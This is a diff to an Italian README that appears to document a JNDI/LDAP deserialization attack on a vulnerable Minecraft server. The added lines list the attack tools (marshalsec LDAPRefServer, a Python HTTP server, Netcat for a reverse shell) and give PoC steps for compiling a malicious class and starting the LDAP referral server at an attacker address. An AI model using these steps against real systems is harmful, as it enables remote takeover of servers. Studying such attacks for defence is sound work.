@@ -27,12 +27,14 @@ Il server vittima ricevuta la classe, deserielizzerà il contenuto ed eseguirà 
 
 A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante e potrà eseguire tutte le operazioni che vorrà, magari installando un malware, creare persistenza, effettuare movimenti laterali ecc...
 
-## Tool necessari
-Per il server LDAP si è utilizzata la classe Java `LDAPRefServer.java` nella sezione jndi della repo GitHub [Marshalsec](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) contenente vari tool inerenti *"all'insicurezza"* di Java.
+## Tool necessari per l'attacco
+* Per il **Server LDAP** si è utilizzata la classe Java `LDAPRefServer.java` nella sezione jndi della repo GitHub [Marshalsec](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) contenente vari tool inerenti *"all'insicurezza"* di Java.
 
-Si esegue utilizzando `java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <inidirizzo_attacante_serverHTTP>#<NomeClasseJavaMalevola> [<porta>]`
+* **JDK 8.1.0_101**: E' necessario l'utilizzo della stessa versione Java con cui il server Minecraft è compilato, altrimenti l'esecuzione della classe malevola sul server non funzionerebbe.
+* **Python**: Per l'avvio di un server http che consenta l'invio della classe Java.
+* **Netcat**: Per consentire la connesione TCP della vittima all'attccante in modo da fornire una reverse shell.
 
+# PoC
+**1)** Scrittura classe Java e compliarla tramite "javac" con la stessa versione del server vulnerabile: `javac <percorso>/NomeClasseJavaMalevola.jar` che darà in output un file .class essenziale per il server HTTP.
 
-
-
-
+**2)** Avvio del server LDAP tramite: `java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <inidirizzo_attacante_serverHTTP>#<NomeClasseJavaMalevola> [<porta>]`
